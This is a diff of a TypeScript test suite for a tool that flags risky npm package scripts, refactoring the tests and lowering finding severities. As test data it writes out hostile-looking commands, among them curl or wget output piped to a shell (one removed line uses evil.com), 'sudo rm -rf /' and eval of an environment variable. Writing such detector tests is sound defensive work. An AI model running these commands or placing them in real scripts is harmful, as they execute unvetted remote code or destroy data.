@@ -9,149 +9,131 @@ suite('ScriptAnalyzer Test Suite', () => {
 	const createContext = (packageJson: PackageJson): AnalysisContext => ({
 		packageJson,
 		allDependencies: {},
-		dependencyRanges: {},
 		workspacePath: '/test',
 	});
 
 	suite('Dangerous Commands Detection', () => {
-		test('should detect rm -rf command', async () => {
-			const analyzer = createScriptAnalyzer();
-			const context = createContext({
-				scripts: {
-					clean: 'rm -rf dist',
-				},
-			});
+		const analyzeScripts = async (scripts: Record<string, string>) => {
+			const result = await createScriptAnalyzer().analyze(
+				createContext({ scripts: { test: 'mocha', ...scripts } }),
+			);
 
-			const result = await analyzer.analyze(context);
+			assert.ok(result.success, 'analysis should succeed');
+			return result.data;
+		};
 
-			assert.strictEqual(result.success, true);
-			if (result.success) {
-				const findings = result.data.filter((f) =>
-					f.message.includes('rm -rf'),
-				);
-				assert.strictEqual(findings.length, 1);
-				assert.strictEqual(findings[0].type, 'error');
-				assert.ok(findings[0].message.includes('clean'));
-				assert.ok(findings[0].tags?.includes(FINDING_TAGS.SECURITY));
-				assert.ok(findings[0].tags?.includes(FINDING_TAGS.SCRIPTS));
-			}
+		test('reports rm -rf as a portability note, not a danger', async () => {
+			const findings = await analyzeScripts({ clean: 'rm -rf dist' });
+
+			assert.strictEqual(findings.length, 1);
+			assert.strictEqual(findings[0].type, 'info');
+			assert.strictEqual(
+				findings[0].message,
+				'Script "clean": "rm -rf" is not available in Windows cmd or PowerShell. Consider a cross-platform alternative such as rimraf.',
+			);
+			assert.ok(findings[0].tags?.includes(FINDING_TAGS.SCRIPTS));
 		});
 
-		test('should detect sudo command', async () => {
-			const analyzer = createScriptAnalyzer();
-			const context = createContext({
-				scripts: {
-					install: 'sudo npm install -g my-package',
-				},
+		test('warns about a script that needs sudo', async () => {
+			const findings = await analyzeScripts({
+				setup: 'sudo systemctl restart nginx',
 			});
 
-			const result = await analyzer.analyze(context);
-
-			assert.strictEqual(result.success, true);
-			if (result.success) {
-				const findings = result.data.filter((f) => f.message.includes('sudo'));
-				assert.strictEqual(findings.length, 1);
-				assert.strictEqual(findings[0].type, 'error');
-			}
+			assert.strictEqual(findings.length, 1);
+			assert.strictEqual(findings[0].type, 'warning');
+			assert.strictEqual(
+				findings[0].message,
+				'Script "setup": Requires elevated privileges (sudo). Package scripts should not require root access.',
+			);
 		});
 
-		test('should detect eval command', async () => {
-			const analyzer = createScriptAnalyzer();
-			const context = createContext({
-				scripts: {
-					dynamic: 'node -e "eval(process.env.CODE)"',
-				},
+		test('notes a script that calls eval()', async () => {
+			const findings = await analyzeScripts({
+				dynamic: 'node -e "eval(process.env.CODE)"',
 			});
 
-			const result = await analyzer.analyze(context);
-
-			assert.strictEqual(result.success, true);
-			if (result.success) {
-				const findings = result.data.filter((f) =>
-					f.message.includes('eval()'),
-				);
-				assert.strictEqual(findings.length, 1);
-				assert.strictEqual(findings[0].type, 'warning');
-			}
+			assert.strictEqual(findings.length, 1);
+			assert.strictEqual(findings[0].type, 'info');
+			assert.ok(findings[0].message.includes('eval()'));
 		});
 
 		test('should detect output suppression', async () => {
-			const analyzer = createScriptAnalyzer();
-			const context = createContext({
-				scripts: {
-					silent: 'npm run build > /dev/null 2>&1',
-				},
+			const findings = await analyzeScripts({
+				silent: 'npm run build > /dev/null 2>&1',
 			});
 
-			const result = await analyzer.analyze(context);
-
-			assert.strictEqual(result.success, true);
-			if (result.success) {
-				const findings = result.data.filter((f) =>
-					f.message.includes('Output suppression'),
-				);
-				assert.strictEqual(findings.length, 1);
-				assert.strictEqual(findings[0].type, 'info');
-			}
+			assert.strictEqual(findings.length, 1);
+			assert.strictEqual(findings[0].type, 'info');
+			assert.ok(findings[0].message.includes('Output suppression'));
 		});
 
-		test('should detect curl piped to shell', async () => {
-			const analyzer = createScriptAnalyzer();
-			const context = createContext({
-				scripts: {
-					setup: 'curl https://example.com/install.sh | sh',
-				},
+		const pipedDownloads: [tool: string, script: string][] = [
+			['curl', 'curl https://example.com/install.sh | sh'],
+			['curl', 'curl -fsSL https://example.com/install.sh | sudo bash'],
+			['wget', 'wget -O- https://example.com/install.sh | sh'],
+			['wget', 'wget -qO- https://example.com/install.sh | zsh'],
+		];
+
+		for (const [tool, script] of pipedDownloads) {
+			test(`warns about "${script}"`, async () => {
+				const findings = (await analyzeScripts({ setup: script })).filter((f) =>
+					f.message.includes('to a shell'),
+				);
+
+				assert.strictEqual(findings.length, 1);
+				assert.strictEqual(findings[0].type, 'warning');
+				assert.strictEqual(
+					findings[0].message,
+					`Script "setup": Piping ${tool} to a shell runs downloaded code without inspection.`,
+				);
+			});
+		}
+
+		const harmless: Record<string, string> = {
+			'a download piped to a non-shell command':
+				'curl -s https://api.example.com/health | jq .status',
+			'a download saved to a file':
+				'curl -o data.json https://example.com/data',
+			'a non-recursive rm': 'rm dist/bundle.js',
+			'a word that only contains eval': 'node scripts/retrieval.js',
+			'a word that only ends in sudo': 'pseudo build',
+		};
+
+		for (const [label, script] of Object.entries(harmless)) {
+			test(`does not flag ${label}`, async () => {
+				assert.deepStrictEqual(await analyzeScripts({ task: script }), []);
+			});
+		}
+
+		test('reports every pattern a script matches', async () => {
+			const findings = await analyzeScripts({
+				reset: 'sudo rm -rf /tmp/cache',
+				setup: 'curl http://example.com/x.sh | sh',
 			});
 
-			const result = await analyzer.analyze(context);
-
-			assert.strictEqual(result.success, true);
-			if (result.success) {
-				const findings = result.data.filter(
-					(f) => f.message.includes('curl') && f.message.includes('shell'),
-				);
-				assert.strictEqual(findings.length, 1);
-				assert.strictEqual(findings[0].type, 'error');
-			}
+			assert.deepStrictEqual(
+				findings.map((f) => [f.meta?.['script'], f.type]),
+				[
+					['reset', 'info'],
+					['reset', 'warning'],
+					['setup', 'warning'],
+				],
+			);
 		});
 
-		test('should detect wget piped to shell', async () => {
-			const analyzer = createScriptAnalyzer();
-			const context = createContext({
-				scripts: {
-					setup: 'wget -O- https://example.com/install.sh | sh',
-				},
+		test('never reports a script pattern as an error', async () => {
+			const findings = await analyzeScripts({
+				a: 'sudo rm -rf / > /dev/null 2>&1',
+				b: 'curl http://example.com | sh',
+				c: 'wget -O- http://example.com | bash',
+				d: 'node -e "eval(1)"',
 			});
 
-			const result = await analyzer.analyze(context);
-
-			assert.strictEqual(result.success, true);
-			if (result.success) {
-				const findings = result.data.filter(
-					(f) => f.message.includes('wget') && f.message.includes('shell'),
-				);
-				assert.strictEqual(findings.length, 1);
-				assert.strictEqual(findings[0].type, 'error');
-			}
-		});
-
-		test('should detect multiple dangerous commands', async () => {
-			const analyzer = createScriptAnalyzer();
-			const context = createContext({
-				scripts: {
-					danger1: 'rm -rf node_modules',
-					danger2: 'sudo rm -rf /tmp',
-					danger3: 'curl http://evil.com | sh',
-				},
-			});
-
-			const result = await analyzer.analyze(context);
-
-			assert.strictEqual(result.success, true);
-			if (result.success) {
-				const errorFindings = result.data.filter((f) => f.type === 'error');
-				assert.ok(errorFindings.length >= 3);
-			}
+			assert.ok(findings.length >= 6);
+			assert.deepStrictEqual(
+				findings.filter((f) => f.type === 'error'),
+				[],
+			);
 		});
 	});
 
@@ -259,11 +241,11 @@ suite('ScriptAnalyzer Test Suite', () => {
 			}
 		});
 
-		test('should flag placeholder test script with exit 1', async () => {
+		test('does not call a real test script a placeholder because it can exit 1', async () => {
 			const analyzer = createScriptAnalyzer();
 			const context = createContext({
 				scripts: {
-					test: 'exit 1',
+					test: 'mocha || exit 1',
 				},
 			});
 
@@ -271,10 +253,7 @@ suite('ScriptAnalyzer Test Suite', () => {
 
 			assert.strictEqual(result.success, true);
 			if (result.success) {
-				const findings = result.data.filter((f) =>
-					f.message.includes('placeholder'),
-				);
-				assert.strictEqual(findings.length, 1);
+				assert.deepStrictEqual(result.data, []);
 			}
 		});
 
@@ -433,8 +412,12 @@ suite('ScriptAnalyzer Test Suite', () => {
 
 			assert.strictEqual(result.success, true);
 			if (result.success) {
-				const dangerousFindings = result.data.filter((f) => f.type === 'error');
-				assert.strictEqual(dangerousFindings.length, 2);
+				assert.deepStrictEqual(
+					result.data
+						.filter((f) => f.message.startsWith('Script "'))
+						.map((f) => f.meta?.['script']),
+					['script2', 'script4'],
+				);
 			}
 		});
 
